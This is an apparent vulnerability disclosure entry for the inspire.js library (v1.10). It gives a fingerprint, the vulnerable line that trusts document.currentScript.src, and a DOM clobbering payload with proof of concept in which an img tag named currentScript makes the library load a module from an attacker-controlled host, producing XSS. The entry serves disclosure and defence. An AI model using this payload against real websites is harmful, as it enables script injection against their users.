## inspire.js

### Meta

+ Library: inspire.js
+ Stars: 1.7K
+ Version: v1.10
+ Fingerprint: `window.hasOwnProperty('inspireLoaded')`
+ Payload: ```<img name="currentScript" src="https://xxx.xxxx.xxx">```
+ Impact: XSS
+ Status: Reported
+ CVE: N/A
+ Foundby: TheHulk

### Library

URL:
+ `https://inspirejs.org/inspire.js`

### Vulnerable Code Snippet

```javascript
let url = new URL("./inspire.mjs", document.currentScript ? document.currentScript.src : "https://inspire.js.org/");
```

## PoC

```
<img name=currentScript src="http://localhost:8000"></img>
<script src="https://inspirejs.org/inspire.js"></script>
```
